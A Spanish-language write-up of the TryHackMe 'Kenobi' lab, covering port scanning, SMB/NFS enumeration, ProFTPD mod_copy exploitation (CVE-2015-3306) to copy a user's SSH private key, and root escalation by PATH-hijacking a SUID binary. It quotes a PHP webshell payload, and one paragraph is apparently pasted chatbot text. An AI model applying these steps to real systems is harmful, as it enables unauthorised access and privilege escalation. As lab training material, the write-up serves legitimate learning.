---
title: Kenobi - TryHackMe
layout: post
permalink: /writeups/THM/kenobi
date: 2025-04-07 11:00:00 -0000
categories: [Laboratorios]
tags: [TryHackMe]
description: >
  Write up en español para Pinkys Kenobi - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sT -Pn -T4 -O 10.10.155.179
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 17:36 CEST
Nmap scan report for 10.10.155.179
Host is up (0.048s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
```

### **Resumen de Puertos Abiertos**

| Puerto  | Servicio       | Descripción Rápida                                                         |
|---------|----------------|----------------------------------------------------------------------------|
| **21**  | FTP            | Puede permitir acceso anónimo o contener archivos interesantes.            |
| **22**  | SSH            | Para acceso remoto; útil si conseguimos credenciales.                      |
| **80**  | HTTP           | Sitio web corriendo — ¡toca hacer enumeración web!                         |
| **111** | RPCBind        | Parte de NFS; puede facilitar el acceso a recursos compartidos.            |
| **139** | NetBIOS-SSN    | Servicio de compartición de archivos en Windows/Samba.                     |
| **445** | Microsoft-DS   | SMB — objetivo común para enumeración y posibles exploits.                 |
| **2049**| NFS            | Network File System — puede permitir montar recursos compartidos sin auth. |


## SMB - SAMBA

Samba es el conjunto estándar de programas para la interoperabilidad con Windows en sistemas Linux y Unix. Permite a los usuarios finales acceder y utilizar archivos, impresoras y otros recursos compartidos comúnmente en la intranet o internet de una empresa. A menudo se le conoce como un sistema de archivos en red.

Samba está basado en el protocolo cliente/servidor común llamado **Server Message Block (SMB)**. SMB fue desarrollado únicamente para Windows, por lo que sin Samba, otras plataformas estarían aisladas de las máquinas Windows, incluso si forman parte de la misma red.

- Puerto 139: 

SMB originalmente se ejecutaba sobre NetBIOS usando el puerto 139. NetBIOS es una capa de transporte antigua que permite a sistemas Windows comunicarse entre sí en una red.

- Puerto 445:

Las versiones modernas de SMB (después de Windows 2000) se ejecutan sobre TCP/IP usando el puerto 445.
Usando TCP permite que SMB trabaje a nivel de internet.

### Enumeración

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.155.179


Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 17:48 CEST
Nmap scan report for 10.10.155.179
Host is up (0.047s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.155.179\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.155.179\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.155.179\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

El resultado muestra diferentes directorios compartidos que se han regisrado gracias a que existe el usuario `guest`.

### Acceder a los recursos compartidos

```bash
smbclient //10.10.155.179/anonymous
```

![alt text](/assets/img/writeups/tryhackme/kenobi/image.png)

En este log parece que encontramos información sobre la configuración de ProFTPD que como vimos en Nmap está corriendo en el puerto 21.

## Puerto 111 - RPCBind

Este es simplemente un servidor que convierte números de programas de llamadas a procedimientos remotos (RPC) en direcciones universales.

Cuando se inicia un servicio RPC, le informa a rpcbind en qué dirección está escuchando y el número del programa RPC que está preparado para atender.

En nuestro caso, el puerto 111 da acceso a un sistema de archivos en red (NFS).

- **rpcbind** actúa como una especie de "centralita" para servicios que usan **RPC**.

- Cada servicio RPC tiene un "número" y un puerto donde escucha; **rpcbind** se encarga de decirle a los clientes dónde encontrar cada servicio.

- Uno de los servicios más comunes que usa esto es **NFS (Network File System)**, que permite **compartir carpetas y archivos por red**, como si fueran locales.

- En este CTF, como tienes el puerto **2049 (NFS)** y **111 (rpcbind)** abiertos, probablemente puedes **montar recursos compartidos remotamente** desde la máquina víctima.


### Enumeración

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.155.179
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 18:07 CEST
Nmap scan report for 10.10.155.179
Host is up (0.048s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs:
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000
| nfs-showmount:
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
```

## ProFTPD

ProFtpd es un sofware open-source compatible con sistemas Unix y Windows.

Podemos averiguar las versiones de los servicios mediante nmap.

```bash
nmap -sV -Pn -T4 -O 10.10.155.179
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 18:10 CEST
Nmap scan report for 10.10.155.179
Host is up (0.048s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ahora que sabemos la versión podemos buscar exploits para esta.

Buscando en internet encontramos el siguiente [CVE-2015-3306](https://github.com/t0kx/exploit-CVE-2015-3306)

De forma alternativa podemos buscar exploit mediante el comando `searchsploit` de metasploit.

```bash
searchsploit proftpd 1.3.5
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - File Copy                                  | linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)    | linux/remote/49908.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution        | linux/remote/36803.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a usar el PoC.

- CVE-2015-3306

Es una vulnerabilidad en ProFTPd mod_copy, un módulo que permite copiar archivos en el servidor usando comandos **SITE CPFR** y **SITE CPTO**.

La falla permite a un atacante escribir archivos arbitrarios en el servidor sin autenticación (si el módulo está activo).

Buenísima pregunta, estás viendo un **exploit para ProFTPd 1.3.5** que aprovecha la vulnerabilidad **CVE-2015-3306**. Te explico de forma clara qué hace este script:

### ¿Qué hace este script en Python?
Este exploit sube una **webshell en PHP** al servidor a través de comandos del protocolo FTP.

1. **Se conecta al FTP** (`__connect()`).
2. **Crea una "copia falsa"** de su propio proceso usando `SITE CPFR /proc/self/cmdline` — esto sirve como truco para engañar el módulo.
3. **Usa `SITE CPTO` para "copiar" un payload malicioso**, que en realidad es una pequeña webshell PHP:  
   ```php
   <?php echo passthru($_GET['cmd']); ?>
   ```
4. **Coloca esa webshell en el servidor web** (por ejemplo en `/var/www/html/backdoor.php`).
5. Verifica si el mensaje `"Copy successful"` aparece → si sí, te dice que ya puedes visitar la shell:  
   `http://[host]/backdoor.php?cmd=whoami`
6. Lanza el comando `whoami` automáticamente para mostrar si funcionó.

### Ganando acceso

Para este ejemplo no vamos a necesitar esta webshell ya que podemos copiar las claves RSA del usuario `kenobi` y usarlas para acceder a la máquina.

![alt text](/assets/img/writeups/tryhackme/kenobi/image-1.png)

Con el comanddo SITE CPFR seleccionamos el archivo que queremos copiar y con el comando SITE CPTO seleccionamos el destino.

Como vimos en la enumeración de del servicio RPC la ruta que se está sirviendo es /var por lo que moveremos la copia a esa ruta a la que tenemos acceso.

```bash
mkdir /tmp/kenobiNFS
mount 10.10.155.179:/var /tmp/kenobiNFS
```
![alt text](/assets/img/writeups/tryhackme/kenobi/image-2.png)

Damos permisos al archivo y conectamos por ssh.

```bash
sudo chmod 600 id_kenobi
ssh -i id_kenobi kenobi@10.10.155.179
```

![alt text](/assets/img/writeups/tryhackme/kenobi/image-3.png)

## Escalando privilegios

### **rw-rw-rw-**
(Sin bits especiales)

### **rwSrwSrwt**
(Con bits SUID, SGID y Sticky activos)

### Primero entendamos qué son los bits **SUID**, **SGID** y **Sticky Bit**:

| **Permiso**  | **En Archivos**                                                                 | **En Directorios**                                                                 |
|--------------|----------------------------------------------------------------------------------|------------------------------------------------------------------------------------|
| **Bit SUID** | El usuario ejecuta el archivo con los **permisos del propietario del archivo**. | –                                                                                  |
| **Bit SGID** | El usuario ejecuta el archivo con los **permisos del grupo propietario**.       | Los archivos creados dentro del directorio heredan el **grupo del directorio**.   |
| **Sticky Bit** | No tiene significado.                                                         | Los usuarios **no pueden borrar archivos de otros usuarios** dentro del directorio.|

Para descubrir binarios con el suid activo ejecutamos `find / -perm -u=s -type f 2>/dev/null`

![alt text](/assets/img/writeups/tryhackme/kenobi/image-4.png)

El único que se sale de lo normal es binario `menu`.

Ejecutamos el binario y veremos que nos ofrece tres opciones:

```bash	
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Mon, 07 Apr 2025 16:48:50 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:39:ce:1c:79:b5
          inet addr:10.10.155.179  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::39:ceff:fe1c:79b5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:3509 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3329 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:250545 (250.5 KB)  TX bytes:558847 (558.8 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:212 errors:0 dropped:0 overruns:0 frame:0
          TX packets:212 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:15882 (15.8 KB)  TX bytes:15882 (15.8 KB)
```

Aquí observamos nos permite realizar diferentes consultas sobre el sistema, entre las que encontramos un ifconfig y una consulta HTTP.

Bien pues como sabemos que está ejecutando un comando del sistema como es ifconfig podemos intentar engañar al sistema haciendo que busque este binario en un directorio que nosotros controlemos como es /tmp.

Esto solo funcionará si el binario no ejecuta el binario desde su ruta absoluta y toma la relativa.

Para empezar nos dirigimos a /tmp y creamos el archivo `ifconfig` con el siguiente contenido:

```bash
echo /bin/sh > /tmp/ifconfig
```

Una vez creado le damos los permisos necesarios:

```bash
chmod 777 /tmp/ifconfig
```

Ahora modificamos la variable PATH del sistema para que apunte a /tmp.

```bash
export PATH=/tmp:$PATH
```

Esta variable por defecto se toma cuando ejecutramos un binario sin su ruta absoluta.

```bash
echo $PATH
/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
```

Ese es el contenido de la variable de entorno PATH que tenemos en nuestro sistema de forma predeterminada.

Cuando la modificamos simplemente eliminamos todo el contenido e indicamos que busque los binarios en la ruta que le indiquemos.

Ahora al ejecutar el menú y seleccionar la opción 3 (ifconfig) este ejecutará el script que creamos en /tmp.

![alt text](/assets/img/writeups/tryhackme/kenobi/image-5.png)
